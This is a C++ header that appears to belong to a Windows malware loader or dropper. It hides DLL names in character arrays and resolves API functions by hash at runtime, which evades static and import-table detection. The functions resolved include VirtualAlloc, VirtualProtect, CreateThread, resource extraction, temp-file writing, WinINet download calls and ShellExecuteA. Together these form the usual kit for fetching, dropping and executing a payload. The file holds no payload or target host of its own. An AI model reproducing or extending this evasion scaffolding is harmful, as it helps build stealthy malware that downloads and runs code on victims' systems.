#pragma once
// Hash function definition
constexpr DWORD Hash(const char* functionName) {
    DWORD hash = 0;
    while (*functionName) {
        hash = (hash * 138) + *functionName;
        functionName++;
    }
    return hash;
}

// Define DLL names
#define Kernel32 { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' }
#define Ntdll { 'N', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0' }
#define Wininet { 'W', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', '\0' }
#define User32 { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\0' }
#define Shell32 { 'S', 'h', 'e', 'l', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' }

// Define Hashes
    constexpr auto FindResourceAHash = Hash("FindResourceA");
    constexpr auto LoadResourceHash = Hash("LoadResource");
    constexpr auto SizeofResourceHash = Hash("SizeofResource");
    constexpr auto LockResourceHash = Hash("LockResource");
    constexpr auto CreateFileAHash = Hash("CreateFileA");
    constexpr auto WriteFileHash = Hash("WriteFile");
    constexpr auto SleepHash = Hash("Sleep");
    constexpr auto GetModuleFileNameAHash = Hash("GetModuleFileNameA");
    constexpr auto GetTempPathAHash = Hash("GetTempPathA");
    constexpr auto CloseHandleHash = Hash("CloseHandle");
    constexpr auto ExitProcessHash = Hash("ExitProcess");
    constexpr auto VirtualProtectHash = Hash("VirtualProtect");
    constexpr auto CreateThreadHash = Hash("CreateThread");
    constexpr auto VirtualAllocHash = Hash("VirtualAlloc");
    constexpr auto LoadLibraryAHash = Hash("LoadLibraryA");
    constexpr auto WaitForSingleObjectHash = Hash("WaitForSingleObject");
    constexpr auto GetCommandLineAHash = Hash("GetCommandLineA");
    constexpr auto GetFileAttributesAHash = Hash("GetFileAttributesA");
    constexpr auto HeapAllocHash = Hash("HeapAlloc");
    constexpr auto GetProcessHeapHash = Hash("GetProcessHeap");
    constexpr auto RtlMoveMemoryHash = Hash("RtlMoveMemory");
    constexpr auto InternetOpenAHash = Hash("InternetOpenA");
    constexpr auto InternetOpenUrlAHash = Hash("InternetOpenUrlA");
    constexpr auto HttpQueryInfoAHash = Hash("HttpQueryInfoA");
    constexpr auto InternetReadFileHash = Hash("InternetReadFile");
    constexpr auto InternetCloseHandleHash = Hash("InternetCloseHandle");
    constexpr auto MessageBoxAHash = Hash("MessageBoxA");
    constexpr auto MessageBoxWHash = Hash("MessageBoxW");
    constexpr auto ShellExecuteAHash = Hash("ShellExecuteA");
    constexpr auto SHGetFolderPathAHash = Hash("SHGetFolderPathA");

// Define Hash Arrays
#define Kernel32Hashes { \
	FindResourceAHash,\
	LoadResourceHash,\
	SizeofResourceHash,\
	LockResourceHash,\
	CreateFileAHash,\
	WriteFileHash,\
	SleepHash,\
	GetModuleFileNameAHash,\
	GetTempPathAHash,\
	CloseHandleHash,\
	ExitProcessHash,\
	VirtualProtectHash,\
	CreateThreadHash,\
	VirtualAllocHash,\
	LoadLibraryAHash,\
	WaitForSingleObjectHash,\
	GetCommandLineAHash,\
	GetFileAttributesAHash,\
	HeapAllocHash,\
	GetProcessHeapHash \
}
#define NtdllHashes { \
	RtlMoveMemoryHash \
}
#define WininetHashes { \
	InternetOpenAHash,\
	InternetOpenUrlAHash,\
	HttpQueryInfoAHash,\
	InternetReadFileHash,\
	InternetCloseHandleHash \
}
#define User32Hashes { \
	MessageBoxAHash,\
	MessageBoxWHash \
}
#define Shell32Hashes { \
	ShellExecuteAHash,\
	SHGetFolderPathAHash \
}

// Define DLL Macro
#define DLL \
    { (char*)szKernel32, kernel32Hashes, sizeof(kernel32Hashes) / sizeof(kernel32Hashes[0]) }, \
    { (char*)szNtdll, ntdllHashes, sizeof(ntdllHashes) / sizeof(ntdllHashes[0]) }, \
    { (char*)szWininet, wininetHashes, sizeof(wininetHashes) / sizeof(wininetHashes[0]) }, \
    { (char*)szUser32, user32Hashes, sizeof(user32Hashes) / sizeof(user32Hashes[0]) }, \
    { (char*)szShell32, shell32Hashes, sizeof(shell32Hashes) / sizeof(shell32Hashes[0]) }

// Kernel32.dll
#define pFindResourceA ((FindResourceAFunc)functions[0][0])
#define pLoadResource ((LoadResourceFunc)functions[0][1])
#define pSizeofResource ((SizeofResourceFunc)functions[0][2])
#define pLockResource ((LockResourceFunc)functions[0][3])
#define pCreateFileA ((CreateFileAFunc)functions[0][4])
#define pWriteFile ((WriteFileFunc)functions[0][5])
#define pSleep ((SleepFunc)functions[0][6])
#define pGetModuleFileNameA ((GetModuleFileNameAFunc)functions[0][7])
#define pGetTempPathA ((GetTempPathAFunc)functions[0][8])
#define pCloseHandle ((CloseHandleFunc)functions[0][9])
#define pExitProcess ((ExitProcessFunc)functions[0][10])
#define pVirtualProtect ((VirtualProtectFunc)functions[0][11])
#define pCreateThread ((CreateThreadFunc)functions[0][12])
#define pVirtualAlloc ((VirtualAllocFunc)functions[0][13])
#define pLoadLibraryA ((LoadLibraryAFunc)functions[0][14])
#define pWaitForSingleObject ((WaitForSingleObjectFunc)functions[0][15])
#define pGetCommandLineA ((GetCommandLineAFunc)functions[0][16])
#define pGetFileAttributesA ((GetFileAttributesAFunc)functions[0][17])
#define pHeapAlloc ((HeapAllocFunc)functions[0][18])
#define pGetProcessHeap ((GetProcessHeapFunc)functions[0][19])

// Ntdll.dll
#define pRtlMoveMemory ((RtlMoveMemoryFunc)functions[1][0])

// Wininet.dll
#define pInternetOpenA ((InternetOpenAFunc)functions[2][0])
#define pInternetOpenUrlA ((InternetOpenUrlAFunc)functions[2][1])
#define pHttpQueryInfoA ((HttpQueryInfoAFunc)functions[2][2])
#define pInternetReadFile ((InternetReadFileFunc)functions[2][3])
#define pInternetCloseHandle ((InternetCloseHandleFunc)functions[2][4])

// User32.dll
#define pMessageBoxA ((MessageBoxAFunc)functions[3][0])
#define pMessageBoxW ((MessageBoxWFunc)functions[3][1])

// Shell32.dll
#define pShellExecuteA ((ShellExecuteAFunc)functions[4][0])
#define pSHGetFolderPathA ((SHGetFolderPathAFunc)functions[4][1])
